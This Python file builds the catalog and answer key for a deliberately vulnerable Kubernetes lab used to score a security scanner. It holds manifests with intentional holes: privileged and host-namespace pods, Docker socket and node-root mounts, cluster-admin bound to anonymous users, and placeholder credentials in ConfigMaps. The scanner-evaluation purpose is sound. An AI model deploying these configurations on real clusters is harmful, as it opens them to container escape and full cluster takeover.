"""
DVKA, the Damn Vulnerable Kubernetes Application: the catalog.

ONE source of truth. Every planted weakness is an `Entry` carrying BOTH the Kubernetes objects
that create it AND the ground truth the evaluation scores the scanner against, so the
manifests and the answer key cannot drift apart.

Design rules (these are what make precision meaningful):

* SINGLE FLAW. Every vulnerable workload starts from a fully hardened baseline and deviates in
  exactly one way, so the set of rules it should trigger is known. Where Kubernetes forces a
  second weakness along with the first (a privileged container must allow privilege
  escalation) it is listed in `expect` and noted in `why`.
* The answer key is written from the rule's documented behaviour and from Kubernetes, never
  copied from the scanner's output. If the scanner disagrees, that is a result.
* `gap` entries are REAL weaknesses the scanner does not claim to detect. They are in the app
  on purpose: recall against what exists, not just against what the tool was built for.
* `negative` entries are secure objects that must NOT be flagged (specificity).
* `fp_probe` entries are secure objects that LOOK like a weakness to a naive rule.

Categories
    WL  workload / pod security      RB  RBAC & identity        NET network exposure
    NS  namespace posture            SEC secrets & credentials  AS  attack surface
    CP  control plane & audit (fixture only: cannot be planted on a normal cluster)
    IMG image & supply chain         GAP documented non-detections
    NEG secure controls              FP  false-positive probes
    RT  runtime correlation          AP  attack paths           PRIO prioritisation
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional

# registry.k8s.io/pause runs as any user on a read-only filesystem, so the hardened baseline
# actually RUNS on a real cluster and needs no image pull on minikube.
IMAGE = "registry.k8s.io/pause:3.9"
LAB = "dvka-lab"                                   # the cluster label the evaluation uses

VULN, BASE, EGOPEN, SECURE = "dvka-vuln", "dvka-baseline", "dvka-egress-open", "dvka-secure"


@dataclass
class Entry:
    id: str
    category: str
    title: str
    objects: list                                  # Kubernetes objects this entry creates
    kind: str = ""                                 # the resource the answer key points at
    namespace: Optional[str] = None
    name: str = ""
    expect: list = field(default_factory=list)     # rule ids that MUST fire on that resource
    why: str = ""                                  # why it is a weakness / why the extras fire
    severity: str = ""
    mitre: str = ""
    cis: str = ""
    gap: bool = False                              # real weakness the scanner does not detect
    gap_reason: str = ""
    would_detect_with: str = ""
    negative: bool = False                         # must produce NO finding
    fp_probe: bool = False                         # negative that resembles a weakness
    fixture_only: bool = False                     # cannot be applied to a real cluster
    grype_expect: list = field(default_factory=list)  # rules expected only when images were scanned (--grype)
    profile: str = "vulnerable"                    # "vulnerable" | "both" (also in hardened)


# --------------------------------------------------------------------------- builders ----
def _container(name="app", image=IMAGE, **sc):
    c = {"name": name, "image": image,
         "securityContext": {"allowPrivilegeEscalation": False, "readOnlyRootFilesystem": True,
                             "capabilities": {"drop": ["ALL"]}},
         "resources": {"limits": {"cpu": "250m", "memory": "128Mi"},
                       "requests": {"cpu": "50m", "memory": "64Mi"}}}
    c["securityContext"].update(sc)
    return c


def _pod_spec(**over):
    spec = {"automountServiceAccountToken": False,
            "securityContext": {"runAsNonRoot": True, "runAsUser": 10001,
                                "seccompProfile": {"type": "RuntimeDefault"}},
            "containers": [_container()]}
    spec.update(over)
    return spec


def _wl(kind, ns, name, spec=None, sa=None, labels=None, replicas=1):
    """A workload of `kind` whose pod template is `spec` (default: the hardened baseline)."""
    spec = spec or _pod_spec()
    labels = labels or {"app": name}
    if sa:
        spec["serviceAccountName"] = sa
    meta = {"name": name, "namespace": ns, "labels": labels}
    if kind == "Pod":
        return {"apiVersion": "v1", "kind": "Pod", "metadata": meta, "spec": spec}
    template = {"metadata": {"labels": labels}, "spec": spec}
    body = {"selector": {"matchLabels": labels}, "template": template}
    if kind == "Deployment":
        return {"apiVersion": "apps/v1", "kind": kind, "metadata": meta,
                "spec": {"replicas": replicas, **body}}
    if kind in ("StatefulSet",):
        return {"apiVersion": "apps/v1", "kind": kind, "metadata": meta,
                "spec": {"replicas": replicas, "serviceName": name, **body}}
    if kind == "DaemonSet":
        return {"apiVersion": "apps/v1", "kind": kind, "metadata": meta, "spec": body}
    if kind == "Job":
        spec["restartPolicy"] = "Never"
        return {"apiVersion": "batch/v1", "kind": kind, "metadata": meta,
                "spec": {"template": {"metadata": {"labels": labels}, "spec": spec}}}
    if kind == "CronJob":
        spec["restartPolicy"] = "Never"
        return {"apiVersion": "batch/v1", "kind": kind, "metadata": meta,
                "spec": {"schedule": "*/10 * * * *", "jobTemplate": {"spec": {"template": {
                    "metadata": {"labels": labels}, "spec": spec}}}}}
    raise ValueError(kind)


def _ns(name, psa=None, labels=None):
    lab = dict(labels or {})
    if psa:
        lab["pod-security.kubernetes.io/enforce"] = psa
    return {"apiVersion": "v1", "kind": "Namespace",
            "metadata": {"name": name, **({"labels": lab} if lab else {})}}


def _svc(ns, name, selector, stype="ClusterIP", port=8080, nodePort=None, **extra):
    p = {"port": port, "targetPort": port}
    if nodePort:
        p["nodePort"] = nodePort
    spec = {"type": stype, "selector": selector, "ports": [p]}
    spec.update(extra)
    return {"apiVersion": "v1", "kind": "Service", "metadata": {"name": name, "namespace": ns},
            "spec": spec}


def _sa(ns, name):
    return {"apiVersion": "v1", "kind": "ServiceAccount",
            "metadata": {"name": name, "namespace": ns}}


def _crole(name, rules):
    return {"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "ClusterRole",
            "metadata": {"name": name}, "rules": rules}


def _role(ns, name, rules):
    return {"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "Role",
            "metadata": {"name": name, "namespace": ns}, "rules": rules}


def _crb(name, role, subjects):
    return {"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "ClusterRoleBinding",
            "metadata": {"name": name},
            "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole",
                        "name": role}, "subjects": subjects}


def _rb(ns, name, role, subjects, role_kind="ClusterRole"):
    return {"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "RoleBinding",
            "metadata": {"name": name, "namespace": ns},
            "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": role_kind,
                        "name": role}, "subjects": subjects}


def _rules(verbs, resources, groups=("",)):
    return [{"apiGroups": list(groups), "resources": list(resources), "verbs": list(verbs)}]


def _configmap(ns, name, data):
    return {"apiVersion": "v1", "kind": "ConfigMap",
            "metadata": {"name": name, "namespace": ns}, "data": data}


def _hostpath(vol, path):
    return {"name": vol, "hostPath": {"path": path}}


def _mod(container_changes=None, pod_changes=None, drop_container_keys=(), drop_sc_keys=(),
         drop_pod_sc_keys=(), drop_pod_keys=()):
    """The hardened baseline with exactly the listed deviations."""
    spec = _pod_spec()
    c = spec["containers"][0]
    for k, v in (container_changes or {}).items():
        if k == "securityContext":
            c["securityContext"].update(v)
        else:
            c[k] = v
    for k in drop_container_keys:
        c.pop(k, None)
    for k in drop_sc_keys:
        c["securityContext"].pop(k, None)
    for k in drop_pod_sc_keys:
        spec["securityContext"].pop(k, None)
    for k in drop_pod_keys:
        spec.pop(k, None)
    spec.update(pod_changes or {})
    return spec


def _w(eid, title, kind, name, spec, expect, why="", sev="", mitre="", cis="", ns=VULN, sa=None):
    return Entry(eid, "WL", title, [_wl(kind, ns, name, spec, sa=sa)], kind, ns, name, expect,
                 why, sev, mitre, cis)


# ============================================================================ the entries
ENTRIES: list[Entry] = []
add = ENTRIES.append

# ---- namespaces -----------------------------------------------------------------------
add(Entry("NS-01", "NS", "Namespace with no Pod Security enforcement, no NetworkPolicy",
          [_ns(VULN)], "Namespace", None, VULN,
          ["compliance-psa-not-restricted", "net-no-networkpolicy", "net-metadata-api-open"],
          "No PSA label means nothing stops a privileged pod; no policy means a flat network "
          "and the cloud metadata API is reachable.", "HIGH", "T1610 / T1552.005", "5.2.1, 5.3.2"))
add(Entry("NS-02", "NS", "Namespace enforcing only 'baseline', ingress-only NetworkPolicy",
          [_ns(BASE, psa="baseline"),
           {"apiVersion": "networking.k8s.io/v1", "kind": "NetworkPolicy",
            "metadata": {"name": "default-deny-ingress", "namespace": BASE},
            "spec": {"podSelector": {}, "policyTypes": ["Ingress"]}}],
          "Namespace", None, BASE,
          ["compliance-psa-not-restricted", "net-metadata-api-open"],
          "baseline is weaker than restricted; with no egress policy pods can reach "
          "169.254.169.254.", "HIGH", "T1552.005", "5.2.1"))
add(Entry("NS-03", "NS", "Egress policy that allows everything (metadata API still open)",
          [_ns(EGOPEN, psa="restricted"),
           {"apiVersion": "networking.k8s.io/v1", "kind": "NetworkPolicy",
            "metadata": {"name": "egress-allow-all", "namespace": EGOPEN},
            "spec": {"podSelector": {}, "policyTypes": ["Egress", "Ingress"],
                     "egress": [{}], "ingress": [{}]}}],
          "Namespace", None, EGOPEN, [],
          "An Egress-type policy with a single empty rule admits every destination, including "
          "169.254.169.254. The scanner treats ANY egress policy as blocking the metadata API.",
          "HIGH", "T1552.005", "",
          gap=True,
          gap_reason="net-metadata-api-open only checks that an Egress-type policy exists, not "
                     "that it excludes the metadata address",
          would_detect_with="evaluate egress rules with netpol.py against 169.254.169.254/32"))
add(Entry("NS-04", "NS", "The built-in 'default' namespace, left as every cluster ships it",
          [_ns("default")], "Namespace", None, "default",
          ["compliance-psa-not-restricted", "net-no-networkpolicy", "net-metadata-api-open"],
          "Every cluster has one; teams deploy into it by accident.", "HIGH", "T1610", "5.2.1, 5.3.2"))
add(Entry("NEG-NS2", "NEG", "The 'default' namespace hardened",
          [_ns("default", psa="restricted"),
           {"apiVersion": "networking.k8s.io/v1", "kind": "NetworkPolicy",
            "metadata": {"name": "default-deny-all", "namespace": "default"},
            "spec": {"podSelector": {}, "policyTypes": ["Ingress", "Egress"]}}],
          "Namespace", None, "default", [], negative=True, profile="hardened-only"))
add(Entry("NEG-NS", "NEG", "Hardened namespace: PSA restricted + default-deny in both directions",
          [_ns(SECURE, psa="restricted"),
           {"apiVersion": "networking.k8s.io/v1", "kind": "NetworkPolicy",
            "metadata": {"name": "default-deny-all", "namespace": SECURE},
            "spec": {"podSelector": {}, "policyTypes": ["Ingress", "Egress"]}}],
          "Namespace", None, SECURE, [], "Everything a namespace should have.",
          negative=True, profile="both"))

# ---- workload / pod security ------------------------------------------------------------
add(_w("WL-01", "Privileged container", "Deployment", "wl-privileged",
       _mod({"securityContext": {"privileged": True, "allowPrivilegeEscalation": True}}),
       ["workload-privileged-container", "workload-allow-priv-escalation"],
       "Kubernetes requires allowPrivilegeEscalation=true for a privileged container, so the "
       "second rule is a genuine consequence.", "CRITICAL", "T1610", "5.2.2"))
add(_w("WL-02", "hostPID shared", "Deployment", "wl-host-pid", _mod(pod_changes={"hostPID": True}),
       ["workload-host-pid"], "", "CRITICAL", "T1610", "5.2.3"))
add(_w("WL-03", "hostNetwork shared (DaemonSet)", "DaemonSet", "wl-host-network",
       _mod(pod_changes={"hostNetwork": True}), ["workload-host-network"], "", "HIGH",
       "T1610 / T1046", "5.2.5"))
add(_w("WL-04", "hostIPC shared (StatefulSet)", "StatefulSet", "wl-host-ipc",
       _mod(pod_changes={"hostIPC": True}), ["workload-host-ipc"], "", "HIGH", "T1610", "5.2.4"))
add(_w("WL-05", "hostPath /etc mounted", "Deployment", "wl-hostpath-etc",
       _mod({"volumeMounts": [{"name": "h", "mountPath": "/host-etc"}]},
            {"volumes": [_hostpath("h", "/etc")]}),
       ["workload-hostpath-root"], "", "CRITICAL", "T1611", "5.2.12"))
add(_w("WL-06", "hostPath / (node root) mounted", "Deployment", "wl-hostpath-root",
       _mod({"volumeMounts": [{"name": "h", "mountPath": "/host"}]},
            {"volumes": [_hostpath("h", "/")]}),
       ["workload-hostpath-root"], "", "CRITICAL", "T1611", "5.2.12"))
add(_w("WL-07", "Writable hostPath mount", "Deployment", "wl-hostpath-writable",
       _mod({"volumeMounts": [{"name": "h", "mountPath": "/data"}]},
            {"volumes": [_hostpath("h", "/var/log/dvka")]}),
       ["workload-hostpath-writable"], "", "HIGH", "T1610", "5.2.12"))
add(_w("WL-08", "Docker socket mounted", "Deployment", "wl-docker-socket",
       _mod({"volumeMounts": [{"name": "d", "mountPath": "/var/run/docker.sock"}]},
            {"volumes": [_hostpath("d", "/var/run/docker.sock")]}),
       ["workload-docker-socket", "workload-hostpath-writable"],
       "The socket is itself a hostPath, so the writable-hostPath rule also applies.",
       "CRITICAL", "T1611", ""))
add(_w("WL-09", "Dangerous capability SYS_ADMIN added", "Deployment", "wl-cap-sys-admin",
       _mod({"securityContext": {"capabilities": {"drop": ["ALL"], "add": ["SYS_ADMIN"]}}}),
       ["workload-dangerous-caps"], "", "HIGH", "T1610", "5.2.8"))
add(_w("WL-10", "Capabilities not dropped", "Deployment", "wl-caps-not-dropped",
       _mod({"securityContext": {"capabilities": {}}}), ["workload-caps-not-dropped"],
       "", "HIGH", "T1610", "5.2.9"))
add(_w("WL-11", "allowPrivilegeEscalation true", "Deployment", "wl-allow-privesc",
       _mod({"securityContext": {"allowPrivilegeEscalation": True}}),
       ["workload-allow-priv-escalation"], "", "HIGH", "T1548", "5.2.6"))
add(_w("WL-12", "Runs as root (UID 0)", "Deployment", "wl-run-as-root",
       _mod({"securityContext": {"runAsUser": 0, "runAsNonRoot": False}}),
       ["workload-run-as-root"], "", "HIGH", "T1610", "5.2.7"))
add(_w("WL-13", "Writable root filesystem", "Deployment", "wl-writable-rootfs",
       _mod({"securityContext": {"readOnlyRootFilesystem": False}}),
       ["workload-writable-root-fs"], "", "MEDIUM", "T1610", ""))
add(_w("WL-14", "No seccomp profile", "Deployment", "wl-no-seccomp",
       _mod(drop_pod_sc_keys=("seccompProfile",)), ["workload-no-seccomp"], "", "MEDIUM",
       "T1610", "5.7.2"))
add(_w("WL-15", "No resource limits", "Deployment", "wl-no-limits",
       _mod(drop_container_keys=("resources",)), ["workload-missing-limits"], "", "MEDIUM",
       "T1499", ""))
add(_w("WL-16", "Service-account token auto-mounted", "Deployment", "wl-sa-automount",
       _mod(drop_pod_keys=("automountServiceAccountToken",)), ["workload-sa-token-automount"],
       "", "MEDIUM", "T1528", "5.1.6"))
add(_w("WL-17", "Image tagged :latest", "Deployment", "wl-latest-tag",
       _mod({"image": "registry.k8s.io/pause:latest"}), ["workload-latest-tag"], "",
       "MEDIUM", "T1525", ""))
add(_w("WL-18", "Image with no tag at all", "Deployment", "wl-untagged-image",
       _mod({"image": "registry.k8s.io/pause"}), ["workload-latest-tag"], "",
       "MEDIUM", "T1525", ""))
add(_w("WL-19", "SSH server inside the container", "Deployment", "wl-sshd",
       _mod({"command": ["/usr/sbin/sshd", "-D"]}), ["workload-sshd-present"], "", "HIGH",
       "T1610", ""))
add(_w("WL-20", "Bare privileged Pod (no controller)", "Pod", "wl-bare-privileged-pod",
       _mod({"securityContext": {"privileged": True, "allowPrivilegeEscalation": True}}),
       ["workload-privileged-container", "workload-allow-priv-escalation"],
       "Same as WL-01 on a standalone Pod.", "CRITICAL", "T1610", "5.2.2"))
add(_w("WL-21", "Privileged container in a CronJob (persistence)", "CronJob", "wl-cronjob-privileged",
       _mod({"securityContext": {"privileged": True, "allowPrivilegeEscalation": True}}),
       ["workload-privileged-container", "workload-allow-priv-escalation"],
       "The pod template sits three levels down in a CronJob.", "CRITICAL", "T1053.003", "5.2.2"))
add(_w("WL-22", "hostNetwork in a Job", "Job", "wl-job-host-network",
       _mod(pod_changes={"hostNetwork": True}), ["workload-host-network"], "", "HIGH",
       "T1610", "5.2.5"))
_init = _pod_spec()
_init["initContainers"] = [{**_container("init"), "securityContext": {
    "privileged": True, "allowPrivilegeEscalation": True,
    "readOnlyRootFilesystem": True, "capabilities": {"drop": ["ALL"]}}}]
add(_w("WL-23", "Privileged INIT container", "Deployment", "wl-init-privileged", _init,
       ["workload-privileged-container", "workload-allow-priv-escalation"],
       "An init container is as much a host-escape primitive as a long-running one.",
       "CRITICAL", "T1610", "5.2.2"))
_sink = _mod({"image": "registry.k8s.io/pause:latest",
              "securityContext": {"privileged": True, "allowPrivilegeEscalation": True,
                                  "readOnlyRootFilesystem": False, "runAsUser": 0,
                                  "runAsNonRoot": False, "capabilities": {}},
              "volumeMounts": [{"name": "d", "mountPath": "/var/run/docker.sock"}]},
             {"hostPID": True, "hostNetwork": True, "hostIPC": True,
              "volumes": [_hostpath("d", "/var/run/docker.sock")]},
             drop_container_keys=("resources",),
             drop_pod_sc_keys=("seccompProfile",), drop_pod_keys=("automountServiceAccountToken",))
add(_w("WL-24", "Kitchen sink: everything wrong at once", "Deployment", "wl-kitchen-sink", _sink,
       ["workload-privileged-container", "workload-allow-priv-escalation", "workload-host-pid",
        "workload-host-network", "workload-host-ipc", "workload-docker-socket",
        "workload-hostpath-writable", "workload-run-as-root", "workload-latest-tag",
        "workload-missing-limits", "workload-caps-not-dropped", "workload-writable-root-fs",
        "workload-no-seccomp", "workload-sa-token-automount"],
       "Every flaw above in one pod.", "CRITICAL", "T1610 / T1611", "5.2.x"))

add(_w("WL-25", "hostPort", "Deployment", "wl-host-port",
       _mod({"ports": [{"containerPort": 8080, "hostPort": 8080}]}), ["workload-host-port"],
       "", "MEDIUM", "T1610", "5.2.13"))
add(_w("WL-26", "shareProcessNamespace", "Deployment", "wl-share-process",
       _mod(pod_changes={"shareProcessNamespace": True}), ["workload-share-process-ns"],
       "", "MEDIUM", "T1610", ""))
_nosc = _mod(drop_container_keys=("securityContext",), drop_pod_sc_keys=("runAsNonRoot", "runAsUser", "seccompProfile"))
_nosc.pop("securityContext")
add(_w("WL-27", "No securityContext at all", "Deployment", "wl-no-security-context", _nosc,
       ["workload-no-security-context", "workload-run-as-root", "workload-allow-priv-escalation",
        "workload-writable-root-fs", "workload-caps-not-dropped", "workload-no-seccomp"],
       "With no securityContext the runtime defaults apply, so the other hardening rules "
       "are true consequences.", "MEDIUM", "T1610", "5.7.3"))
add(_w("WL-28", "Windows HostProcess container (fixture only)", "Deployment", "wl-host-process",
       _mod({"securityContext": {"windowsOptions": {"hostProcess": True}}}),
       ["workload-windows-hostprocess"], "A Linux cluster rejects this pod, so it is fixture only.",
       "CRITICAL", "T1611", "5.2.11"))
ENTRIES[-1].fixture_only = True
add(_w("WL-29", "Workload in the default namespace", "Deployment", "wl-default-ns",
       _mod(), ["workload-default-namespace"], "", "LOW", "T1610", "5.7.4", ns="default"))

# ---- RBAC -------------------------------------------------------------------------------
def _r(eid, title, kind, name, objs, expect, why="", sev="", mitre="", cis="", ns=None):
    return Entry(eid, "RB", title, objs, kind, ns, name, expect, why, sev, mitre, cis)


add(_r("RB-01", "Role with wildcard verbs", "ClusterRole", "dvka-wildcard-verbs",
       [_crole("dvka-wildcard-verbs", _rules(["*"], ["pods"]))],
       ["rbac-wildcard-verbs", "rbac-create-pods"],
       "* on pods includes create, so the pod-creation rule is a true consequence.",
       "CRITICAL", "T1078", "5.1.3"))
add(_r("RB-02", "Role with wildcard resources", "ClusterRole", "dvka-wildcard-resources",
       [_crole("dvka-wildcard-resources", _rules(["get"], ["*"]))],
       ["rbac-wildcard-resources", "rbac-secret-read-broad", "rbac-node-proxy"],
       "get on every resource includes get on Secrets and on nodes/proxy, so those rules are "
       "true consequences.", "CRITICAL", "T1078", "5.1.3"))
add(_r("RB-03", "God-mode role (*, *, *)", "ClusterRole", "dvka-god-mode",
       [_crole("dvka-god-mode", _rules(["*"], ["*"], ["*"]))],
       ["rbac-wildcard-verbs", "rbac-wildcard-resources", "rbac-secret-read-broad",
        "rbac-can-delete-events", "rbac-coredns-configmap-write", "rbac-create-pods",
        "rbac-create-pv", "rbac-csr-approve", "rbac-node-proxy", "rbac-sa-token-create",
        "rbac-webhook-config-write"],
       "(*, *, *) grants every verb on every resource, so each specific rule is a true "
       "consequence.", "CRITICAL", "T1078", "5.1.3"))
add(_r("RB-04", "ClusterRole can read every Secret", "ClusterRole", "dvka-secret-reader",
       [_crole("dvka-secret-reader", _rules(["get", "list"], ["secrets"]))],
       ["rbac-secret-read-broad"], "", "HIGH", "T1552.007", "5.1.2"))
add(_r("RB-05", "bind / escalate / impersonate", "ClusterRole", "dvka-escalator",
       [_crole("dvka-escalator", _rules(["bind", "escalate", "impersonate"],
                                        ["clusterroles", "users"], ("rbac.authorization.k8s.io", "")))],
       ["rbac-bind-escalate-verbs"], "", "CRITICAL", "T1078", "5.1.8"))
add(_r("RB-06", "Role can delete events (cover tracks)", "ClusterRole", "dvka-event-cleaner",
       [_crole("dvka-event-cleaner", _rules(["delete"], ["events"]))],
       ["rbac-can-delete-events"], "", "HIGH", "T1070", ""))
add(_r("RB-07", "Role can rewrite ConfigMaps (CoreDNS poisoning)", "ClusterRole",
       "dvka-configmap-writer",
       [_crole("dvka-configmap-writer", _rules(["patch", "update"], ["configmaps"]))],
       ["rbac-coredns-configmap-write"], "", "HIGH", "T1565", ""))
add(_r("RB-08", "cluster-admin bound to the default ServiceAccount", "ClusterRoleBinding",
       "dvka-default-sa-admin",
       [_crb("dvka-default-sa-admin", "cluster-admin",
             [{"kind": "ServiceAccount", "name": "default", "namespace": VULN}])],
       ["rbac-cluster-admin-default-sa"], "", "CRITICAL", "T1078.004", "5.1.1"))
add(_r("RB-09", "cluster-admin bound to a named user", "ClusterRoleBinding", "dvka-alice-admin",
       [_crb("dvka-alice-admin", "cluster-admin",
             [{"kind": "User", "name": "alice@corp.example",
               "apiGroup": "rbac.authorization.k8s.io"}])],
       ["rbac-cluster-admin-user-binding"], "", "HIGH", "T1078", "5.1.1"))
add(_r("RB-10", "cluster-admin bound to system:authenticated", "ClusterRoleBinding",
       "dvka-everyone-admin",
       [_crb("dvka-everyone-admin", "cluster-admin",
             [{"kind": "Group", "name": "system:authenticated",
               "apiGroup": "rbac.authorization.k8s.io"}])],
       ["rbac-broad-subject-admin"], "", "CRITICAL", "T1078", "5.1.1"))
add(_r("RB-11", "cluster-admin bound to system:anonymous", "ClusterRoleBinding",
       "dvka-anonymous-admin",
       [_crb("dvka-anonymous-admin", "cluster-admin",
             [{"kind": "User", "name": "system:anonymous",
               "apiGroup": "rbac.authorization.k8s.io"}])],
       ["rbac-broad-subject-admin"], "", "CRITICAL", "T1078", "5.1.1"))
add(_r("RB-12", "edit granted to every ServiceAccount in a namespace", "RoleBinding",
       "dvka-sa-edit",
       [_rb(VULN, "dvka-sa-edit", "edit",
            [{"kind": "Group", "name": f"system:serviceaccounts:{VULN}",
              "apiGroup": "rbac.authorization.k8s.io"}])],
       ["rbac-broad-subject-admin"], "", "HIGH", "T1078", "", ns=VULN))
add(_r("RB-13", "Namespaced Role with wildcard verbs", "Role", "dvka-ns-wildcard",
       [_role(VULN, "dvka-ns-wildcard", _rules(["*"], ["pods"]))],
       ["rbac-wildcard-verbs", "rbac-create-pods"],
       "* on pods includes create.", "CRITICAL", "T1078", "5.1.3", ns=VULN))
add(_r("RB-14", "Role can create pods", "ClusterRole", "dvka-pod-creator",
       [_crole("dvka-pod-creator", _rules(["create"], ["pods"]))], ["rbac-create-pods"],
       "", "HIGH", "T1610", "5.1.4"))
add(_r("RB-15", "system:masters group bound", "ClusterRoleBinding", "dvka-masters",
       [_crb("dvka-masters", "view", [{"kind": "Group", "name": "system:masters",
                                       "apiGroup": "rbac.authorization.k8s.io"}])],
       ["rbac-system-masters"], "", "CRITICAL", "T1078", "5.1.7"))
add(_r("RB-16", "Role can create PersistentVolumes", "ClusterRole", "dvka-pv-creator",
       [_crole("dvka-pv-creator", _rules(["create"], ["persistentvolumes"]))],
       ["rbac-create-pv"], "", "MEDIUM", "T1611", "5.1.9"))
add(_r("RB-17", "Role can use nodes/proxy", "ClusterRole", "dvka-node-proxy",
       [_crole("dvka-node-proxy", _rules(["get"], ["nodes/proxy"]))],
       ["rbac-node-proxy"], "", "HIGH", "T1611", "5.1.10"))
add(_r("RB-18", "Role can approve CSRs", "ClusterRole", "dvka-csr-approver",
       [_crole("dvka-csr-approver", _rules(["update"], ["certificatesigningrequests/approval"],
                                           ("certificates.k8s.io",)))],
       ["rbac-csr-approve"], "", "HIGH", "T1078", "5.1.11"))
add(_r("RB-19", "Role can edit admission webhooks", "ClusterRole", "dvka-webhook-editor",
       [_crole("dvka-webhook-editor", _rules(["update", "patch"],
                                             ["validatingwebhookconfigurations"],
                                             ("admissionregistration.k8s.io",)))],
       ["rbac-webhook-config-write"], "", "HIGH", "T1554", "5.1.12"))
add(_r("RB-20", "Role can mint ServiceAccount tokens", "ClusterRole", "dvka-token-minter",
       [_crole("dvka-token-minter", _rules(["create"], ["serviceaccounts/token"]))],
       ["rbac-sa-token-create"], "", "HIGH", "T1528", "5.1.13"))
add(Entry("NEG-RB", "NEG", "Least-privilege Role bound to one ServiceAccount",
          [_sa(SECURE, "reader-sa"), _role(SECURE, "dvka-pod-reader", _rules(["get", "list"], ["pods"])),
           _rb(SECURE, "dvka-pod-reader-binding", "dvka-pod-reader",
               [{"kind": "ServiceAccount", "name": "reader-sa", "namespace": SECURE}],
               role_kind="Role")],
          "Role", SECURE, "dvka-pod-reader", [], negative=True, profile="both"))
add(Entry("GAP-RB", "GAP", "Namespaced Role that can read Secrets",
          [_role(VULN, "dvka-ns-secret-reader", _rules(["get", "list"], ["secrets"]))],
          "Role", VULN, "dvka-ns-secret-reader", [],
          "Reading Secrets in a namespace is a credential-theft primitive.", "HIGH", "T1552.007",
          gap=True, gap_reason="rbac-secret-read-broad only inspects ClusterRoles by design",
          would_detect_with="extend the rule to Roles and report namespace-scoped blast radius"))

# ---- network exposure -----------------------------------------------------------------------
def _n(eid, title, kind, name, objs, expect, why="", sev="", mitre="", ns=VULN):
    return Entry(eid, "NET", title, objs, kind, ns, name, expect, why, sev, mitre)


add(_n("NET-01", "NodePort Service", "Service", "net-nodeport",
       [_svc(VULN, "net-nodeport", {"app": "wl-privileged"}, "NodePort", nodePort=31080)],
       ["net-nodeport-service"], "", "MEDIUM", "T1190"))
add(_n("NET-02", "LoadBalancer with no source ranges", "Service", "net-lb-open",
       [_svc(VULN, "net-lb-open", {"app": "wl-latest-tag"}, "LoadBalancer")],
       ["net-lb-no-source-range"], "", "HIGH", "T1190"))
add(_n("NET-03", "Kubernetes dashboard exposed", "Service", "kubernetes-dashboard",
       [_svc(VULN, "kubernetes-dashboard", {"app": "kubernetes-dashboard"}, "NodePort", 8443,
             nodePort=30443)],
       ["net-dashboard-exposed", "net-nodeport-service"],
       "An exposed dashboard is also a NodePort Service.", "CRITICAL", "T1133"))
add(_n("NET-04", "Ingress without TLS", "Ingress", "net-ingress-plain",
       [{"apiVersion": "networking.k8s.io/v1", "kind": "Ingress",
         "metadata": {"name": "net-ingress-plain", "namespace": VULN},
         "spec": {"rules": [{"host": "plain.dvka.example", "http": {"paths": [
             {"path": "/", "pathType": "Prefix", "backend": {"service": {
                 "name": "net-lb-open", "port": {"number": 8080}}}}]}}]}}],
       ["net-ingress-no-tls"], "", "HIGH", "T1190"))
add(Entry("NEG-NET", "NEG", "ClusterIP Service, LoadBalancer with source ranges, Ingress with TLS",
          [_svc(SECURE, "neg-clusterip", {"app": "neg-api"}),
           _svc(SECURE, "neg-lb-restricted", {"app": "neg-api"}, "LoadBalancer",
                loadBalancerSourceRanges=["203.0.113.0/24"]),
           {"apiVersion": "networking.k8s.io/v1", "kind": "Ingress",
            "metadata": {"name": "neg-ingress-tls", "namespace": SECURE},
            "spec": {"tls": [{"hosts": ["secure.dvka.example"], "secretName": "tls"}],
                     "rules": [{"host": "secure.dvka.example", "http": {"paths": [
                         {"path": "/", "pathType": "Prefix", "backend": {"service": {
                             "name": "neg-clusterip", "port": {"number": 8080}}}}]}}]}}],
          "Service", SECURE, "neg-lb-restricted", [], negative=True, profile="both"))

# ---- secrets & credentials -----------------------------------------------------------------------
def _s(eid, title, kind, name, objs, expect, why="", sev="", mitre="", cis="", ns=VULN):
    return Entry(eid, "SEC", title, objs, kind, ns, name, expect, why, sev, mitre, cis)


_envspec = _mod({"env": [{"name": "DB_PASSWORD", "valueFrom": {"secretKeyRef": {
    "name": "db-credentials", "key": "password"}}}]})
add(_s("SEC-01", "Secret injected through an environment variable", "Deployment", "sec-env-secret",
       [_wl("Deployment", VULN, "sec-env-secret", _envspec)], ["sec-env-var-secrets"],
       "", "HIGH", "T1552.001", "5.4.1"))
add(_s("SEC-02", "ConfigMap holding a password", "ConfigMap", "sec-cm-password",
       [_configmap(VULN, "sec-cm-password", {"db_password": "hunter2"})],
       ["sec-configmap-credentials"], "", "HIGH", "T1552.001"))
add(_s("SEC-03", "ConfigMap holding an API key in a value", "ConfigMap", "sec-cm-apikey",
       [_configmap(VULN, "sec-cm-apikey", {"settings": "api_key=AKIAIOSFODNN7EXAMPLE"})],
       ["sec-configmap-credentials"], "", "HIGH", "T1552.001"))
_credspec = _mod({"volumeMounts": [{"name": "c", "mountPath": "/root/.aws/credentials",
                                    "subPath": "credentials"}]},
                 {"volumes": [{"name": "c", "secret": {"secretName": "aws-credentials"}}]})
add(_s("SEC-04", "Cloud credentials file mounted into the pod", "Deployment", "sec-cloud-creds",
       [_wl("Deployment", VULN, "sec-cloud-creds", _credspec)], ["sec-mounted-cloud-creds"],
       "", "HIGH", "T1552.005"))
add(Entry("SEC-05", "SEC", "etcd encryption at rest not enabled", [], "ControlPlane", None, "etcd",
          ["sec-etcd-not-encrypted"],
          "The API server runs without --encryption-provider-config.", "CRITICAL", "T1552.007",
          "1.2.28", fixture_only=True))
_neg_secret_spec = _mod({"volumeMounts": [{"name": "s", "mountPath": "/etc/app/secrets",
                                            "readOnly": True}]},
                        {"volumes": [{"name": "s", "secret": {"secretName": "db-credentials"}}]})
add(Entry("NEG-SEC", "NEG", "Secret consumed as a read-only file; benign ConfigMap",
          [{"apiVersion": "v1", "kind": "Secret",
            "metadata": {"name": "db-credentials", "namespace": SECURE}, "type": "Opaque",
            "stringData": {"password": "placeholder-not-a-real-secret"}},
           _wl("Deployment", SECURE, "neg-secret-as-file", _neg_secret_spec),
           _configmap(SECURE, "neg-app-config", {"log_level": "info", "region": "eu-west-1"})],
          "Deployment", SECURE, "neg-secret-as-file", [], negative=True, profile="both"))
